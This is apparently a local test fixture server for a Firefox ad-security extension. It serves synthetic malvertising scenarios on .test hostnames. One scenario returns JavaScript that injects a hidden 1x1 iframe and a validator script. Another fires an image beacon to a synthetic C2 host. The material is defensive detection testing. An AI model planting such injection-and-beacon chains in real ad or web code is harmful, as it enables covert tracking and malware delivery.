#!/usr/bin/env node
/**
 * Local synthetic fixture server for manual verification in Firefox. Serves pages and
 * scripts under reserved .test hostnames that are mapped to 127.0.0.1 via the Firefox
 * pref network.dns.localDomains (see docs/testing.md). Nothing here contacts the internet.
 *
 *   node scripts/fixture-server.mjs [port=8787]
 *
 * Scenarios (open in Firefox with a DEV build of the extension):
 *   http://publisher.synthetic-site.test:PORT/benign        ordinary third-party ad, no detections expected
 *   http://publisher.synthetic-site.test:PORT/exposure      NOAS getAd script returning 0 bytes (informational)
 *   http://publisher.synthetic-site.test:PORT/selected      NOAS getAd returning JS that injects a 1x1 iframe to C2 host (chain)
 *   http://publisher.synthetic-site.test:PORT/ioc           plain image beacon to a synthetic malicious host
 */
import { createServer } from "node:http";

const port = Number(process.argv[2] ?? 8787);
const H = {
  publisher: `publisher.synthetic-site.test:${port}`,
  ads: `ads.synthetic-benign.test:${port}`,
  noas: `noas.synthetic-adfection.test:${port}`,
  c2: `c2.synthetic-adfection.test:${port}`,
  validator: `validator.synthetic-adfection.test:${port}`,
  staging: `staging.synthetic-dsp.test:${port}`,
};

// Scenario pages reload themselves every 30 s so that a sensor registered after the first
// load (e.g. the opt-in page sensor, registered once the extension finishes initialising)
// observes a later load. Creative and helper pages do not refresh.
const page = (
  title,
  body,
  refresh = false,
) => `<!doctype html><meta charset="utf-8"><title>${title}</title>
${refresh ? '<meta http-equiv="refresh" content="30">' : ""}
<h1>${title}</h1><p>Synthetic AdTripwire fixture. No real infrastructure is contacted.</p>${body}`;

const adFrame = (inner) =>
  `<iframe title="ad" width="300" height="250" src="http://${H.ads}/creative?${inner}"></iframe>`;

const routes = {
  // Headless Chrome accepts a single start URL: this page embeds every scenario as an iframe.
  "/all": () =>
    page(
      "All scenarios",
      ["/benign", "/exposure", "/selected", "/ioc"]
        .map(
          (p) =>
            `<h2>${p}</h2><iframe title="scenario ${p}" width="600" height="320" src="http://${H.publisher}${p}"></iframe>`,
        )
        .join(""),
      true,
    ),
  "/benign": () => page("Benign ad", adFrame("mode=benign"), true),
  "/exposure": () => page("NOAS exposure (empty response)", adFrame("mode=exposure"), true),
  "/selected": () => page("NOAS selected (JS returned)", adFrame("mode=selected"), true),
  "/ioc": () =>
    page(
      "Known IOC beacon",
      `<img src="http://${H.c2}/pixel.gif?x=1" width="1" height="1" alt="">`,
      true,
    ),
  "/creative": (q) => {
    const mode = q.get("mode") ?? "benign";
    if (mode === "benign")
      return page("Creative", `<script src="http://${H.ads}/ad.js?w=300&h=250&slot=top"></script>`);
    const idfa = "00000000-0000-0000-0000-000000000000";
    return page(
      "Creative",
      `<div id="ad-wrapper"><script src="http://${H.noas}/getAd?idfa=${idfa}&ipv4=192.0.2.1&dom=publisher.synthetic-site.test&devicemodel=test&os=test&mode=${esc(mode)}"></script></div>`,
    );
  },
  "/ad.js": () => ({
    type: "application/javascript",
    body: `document.body.insertAdjacentHTML("beforeend","<p>benign ad script loaded</p>");`,
  }),
  "/getAd": (q) => {
    if (q.get("mode") === "selected") {
      return {
        type: "application/javascript",
        body: `(function(){var f=document.createElement("iframe");f.style.cssText="width:1px;height:1px;border:none";f.src="http://${H.staging}/iframe?impid=synthetic";document.body.appendChild(f);
var s=document.createElement("script");s.id="getAdScript";s.src="http://${H.validator}/check.js?q=c3ludGhldGlj";document.body.appendChild(s);})();`,
      };
    }
    return { type: "application/javascript", body: "" };
  },
  "/iframe": () =>
    page("staging frame", `<img src="http://${H.c2}/pixel.gif?t=1" width="1" height="1" alt="">`),
  "/check.js": () => ({
    type: "application/javascript",
    body: "/* synthetic validator response */",
  }),
  "/pixel.gif": () => ({
    type: "image/gif",
    body: Buffer.from("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7", "base64"),
  }),
};

const esc = (v) => String(v).replace(/[&<>"']/g, (c) => `&#${c.charCodeAt(0)};`);
createServer((req, res) => {
  let url;
  try {
    url = new URL(req.url ?? "/", `http://${req.headers.host ?? "localhost"}`);
  } catch {
    res.writeHead(400).end("bad request");
    return;
  }
  const handler = routes[url.pathname];
  if (!handler) {
    res.writeHead(404).end("not found");
    return;
  }
  const out = handler(url.searchParams);
  if (typeof out === "string") {
    res
      .writeHead(200, { "content-type": "text/html; charset=utf-8", "cache-control": "no-store" })
      .end(out);
  } else {
    res
      .writeHead(200, {
        "content-type": out.type,
        "content-length": Buffer.byteLength(out.body),
        "cache-control": "no-store",
      })
      .end(out.body);
  }
}).listen(port, "127.0.0.1", () => {
  console.log(`fixture server on http://127.0.0.1:${port}`);
  console.log(
    `Start Firefox with: web-ext run -s apps/extension-firefox/dist --pref network.dns.localDomains=${Object.values(
      H,
    )
      .map((h) => h.split(":")[0])
      .join(",")}`,
  );
  console.log(`Then open http://${H.publisher}/benign | /exposure | /selected | /ioc`);
});
